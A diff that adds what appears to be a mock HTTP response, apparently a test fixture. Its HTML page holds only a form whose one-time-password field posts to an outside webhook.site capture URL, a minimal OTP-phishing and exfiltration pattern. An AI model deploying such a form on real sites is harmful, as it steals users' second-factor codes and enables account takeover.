@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="https://webhook.site/0b1c2d3e" method="post"><input type="text" name="otp"></form></body></html>
